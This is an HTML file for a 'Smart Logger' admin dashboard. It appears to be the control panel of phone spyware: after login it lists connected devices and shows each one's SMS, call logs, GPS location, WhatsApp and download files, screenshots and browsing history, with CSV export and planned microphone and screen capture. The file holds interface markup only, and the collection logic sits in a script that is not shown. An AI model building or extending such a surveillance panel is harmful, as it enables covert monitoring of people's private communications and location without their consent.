<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Logger - Premium Admin Dashboard</title>
    <!-- Bootstrap CSS (CDN) -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome (CDN) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Leaflet CSS (for Maps) -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <!-- Custom CSS -->
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <!-- Login View -->
    <div class="container login-container" id="loginView">
        <div class="text-center mb-4">
            <i class="fas fa-shield-alt fa-3x text-primary"></i>
            <h2 class="mt-2">Admin Login</h2>
        </div>
        <form id="loginForm">
            <div class="mb-3">
                <label for="loginEmail" class="form-label">Email</label>
                <input type="email" class="form-control" id="loginEmail" required placeholder="admin@example.com">
            </div>
            <div class="mb-3">
                <label for="loginPassword" class="form-label">Password</label>
                <input type="password" class="form-control" id="loginPassword" required placeholder="••••••••">
            </div>
            <div id="loginError" class="text-danger mb-3"></div>
            <button type="submit" class="btn btn-primary w-100">Login</button>
        </form>
    </div>

    <!-- Main Dashboard View (Initially Hidden) -->
    <div id="dashboardView" style="display: none;">
        <nav class="navbar navbar-expand-lg navbar-dark sticky-top">
            <div class="container-fluid">
                <a class="navbar-brand" href="#"><i class="fas fa-user-secret"></i> Smart Logger</a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarNav">
                    <ul class="navbar-nav ms-auto">
                        <li class="nav-item">
                            <span class="nav-link" id="loggedInUserEmail"></span>
                        </li>
                        <li class="nav-item">
                            <button class="btn btn-outline-danger btn-sm" id="logoutButton"><i class="fas fa-sign-out-alt"></i> Logout</button>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>

        <div class="container-fluid mt-3">
            <div class="row">
                <!-- Sidebar for Device List -->
                <nav id="sidebarMenu" class="col-md-3 col-lg-2 d-md-block sidebar collapse dashboard-sidebar p-3 rounded">
                    <h4><i class="fas fa-mobile-alt text-primary"></i> Devices</h4>
                    <div class="input-group mb-3">
                        <span class="input-group-text"><i class="fas fa-search text-primary"></i></span>
                        <input type="text" id="deviceSearch" class="form-control form-control-sm" placeholder="Search UID or Alias...">
                    </div>
                    <div class="list-group" id="deviceList" style="max-height: 70vh; overflow-y: auto;">
                        <div class="text-center p-3" id="noDevicesMessage" style="display:none;">No devices connected.</div>
                    </div>
                </nav>

                <!-- Main Content Area for Device Details -->
                <main class="col-md-9 ms-sm-auto col-lg-10 px-md-4">
                    <div id="deviceDetailView" class="dashboard-container-main" style="display: none;">
                        <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                            <h3 id="selectedDeviceAlias" class="h3">Select a Device</h3>
                            <div id="selectedDeviceStatus" class="fw-bold"></div>
                        </div>
                        
                        <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
                            <li class="nav-item" role="presentation"><button class="nav-link active" id="pills-sms-tab" data-bs-toggle="pill" data-bs-target="#pills-sms" type="button" role="tab"><i class="fas fa-sms"></i> SMS</button></li>
                            <li class="nav-item" role="presentation"><button class="nav-link" id="pills-calls-tab" data-bs-toggle="pill" data-bs-target="#pills-calls" type="button" role="tab"><i class="fas fa-phone-alt"></i> Calls</button></li>
                            <li class="nav-item" role="presentation"><button class="nav-link" id="pills-apps-tab" data-bs-toggle="pill" data-bs-target="#pills-apps" type="button" role="tab"><i class="fas fa-th-large"></i> Apps</button></li>
                            <li class="nav-item" role="presentation"><button class="nav-link" id="pills-battery-tab" data-bs-toggle="pill" data-bs-target="#pills-battery" type="button" role="tab"><i class="fas fa-battery-full"></i> Battery</button></li>
                            <li class="nav-item" role="presentation"><button class="nav-link" id="pills-location-tab" data-bs-toggle="pill" data-bs-target="#pills-location" type="button" role="tab"><i class="fas fa-map-marker-alt"></i> Location</button></li>
                            <li class="nav-item" role="presentation"><button class="nav-link" id="pills-files-tab" data-bs-toggle="pill" data-bs-target="#pills-files" type="button" role="tab"><i class="fas fa-folder-open"></i> Files</button></li>
                            <li class="nav-item" role="presentation"><button class="nav-link" id="pills-screenshots-tab" data-bs-toggle="pill" data-bs-target="#pills-screenshots" type="button" role="tab"><i class="fas fa-camera"></i> Screenshots</button></li>
                            <li class="nav-item" role="presentation"><button class="nav-link" id="pills-browsing-tab" data-bs-toggle="pill" data-bs-target="#pills-browsing" type="button" role="tab"><i class="fas fa-globe"></i> Browsing</button></li>
                            <li class="nav-item" role="presentation"><button class="nav-link" id="pills-deviceinfo-tab" data-bs-toggle="pill" data-bs-target="#pills-deviceinfo" type="button" role="tab"><i class="fas fa-info-circle"></i> Info</button></li>
                            <li class="nav-item" role="presentation"><button class="nav-link disabled" title="Future: Mic Recorder"><i class="fas fa-microphone"></i> Mic</button></li>
                            <li class="nav-item" role="presentation"><button class="nav-link disabled" title="Future: Screen Capture"><i class="fas fa-desktop"></i> Screen</button></li>
                        </ul>
                        <div class="tab-content" id="pills-tabContent">
                            <div class="tab-pane fade show active" id="pills-sms" role="tabpanel">
                                <div class="d-flex justify-content-between align-items-center mb-2"><h5>SMS Logs</h5><button class="btn btn-sm btn-outline-info export-btn" data-type="sms"><i class="fas fa-file-csv"></i> Export CSV</button></div>
                                <div id="smsList" class="list-group data-list-container"></div><div id="smsEmptyState" class="empty-state-message">No SMS logs available.</div>
                            </div>
                            <div class="tab-pane fade" id="pills-calls" role="tabpanel">
                                <div class="d-flex justify-content-between align-items-center mb-2"><h5>Call Logs</h5><button class="btn btn-sm btn-outline-info export-btn" data-type="calls"><i class="fas fa-file-csv"></i> Export CSV</button></div>
                                <div id="callList" class="list-group data-list-container"></div><div id="callsEmptyState" class="empty-state-message">No call logs available.</div>
                            </div>
                            <div class="tab-pane fade" id="pills-apps" role="tabpanel">
                                <h5>Installed Apps</h5><div id="appList" class="list-group data-list-container"></div><div id="appsEmptyState" class="empty-state-message">No apps data available.</div>
                            </div>
                            <div class="tab-pane fade" id="pills-battery" role="tabpanel">
                                <h5>Battery Info</h5><div id="batteryInfo"></div><div id="batteryEmptyState" class="empty-state-message">No battery info available.</div>
                            </div>
                            <div class="tab-pane fade" id="pills-location" role="tabpanel">
                                <h5>GPS Location</h5><div id="map"></div><div id="locationInfo" class="mt-2"></div><div id="locationEmptyState" class="empty-state-message">No location data available.</div>
                            </div>
                            <div class="tab-pane fade" id="pills-files" role="tabpanel">
                                <h5>File Logs (WhatsApp/Downloads)</h5><div id="fileList" class="list-group data-list-container"></div><div id="filesEmptyState" class="empty-state-message">No file logs available.</div>
                            </div>
                            <div class="tab-pane fade" id="pills-screenshots" role="tabpanel">
                                <h5>Screenshots</h5><div id="screenshotGallery" class="row"></div><div id="screenshotsEmptyState" class="empty-state-message">No screenshots available.</div>
                            </div>
                            <div class="tab-pane fade" id="pills-browsing" role="tabpanel">
                                <h5>Browsing History</h5><div id="browsingHistoryList" class="list-group data-list-container"></div><div id="browsingEmptyState" class="empty-state-message">No browsing history available.</div>
                            </div>
                            <div class="tab-pane fade" id="pills-deviceinfo" role="tabpanel">
                                <h5>Device Info</h5><div id="deviceInfo"></div><div id="deviceInfoEmptyState" class="empty-state-message">No device info available.</div>
                            </div>
                        </div>
                    </div>
                    <div id="noDeviceSelectedView" class="dashboard-container-main text-center p-5">
                        <h3><i class="fas fa-mobile-alt"></i> Please select a device from the sidebar</h3>
                        <p class="text-muted">Click on a device from the list on the left to view its data.</p>
                    </div>
                </main>
            </div>
        </div>
    </div>

    <div id="loadingOverlay" class="loading-overlay-style">
        <div class="spinner-border text-primary loading-spinner" role="status">
            <span class="visually-hidden">Loading...</span>
        </div>
    </div>

    <!-- Bootstrap JS (CDN) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Leaflet JS (for Maps) -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <!-- Main Application Logic -->
    <script type="module" src="main.js"></script>
</body>
</html>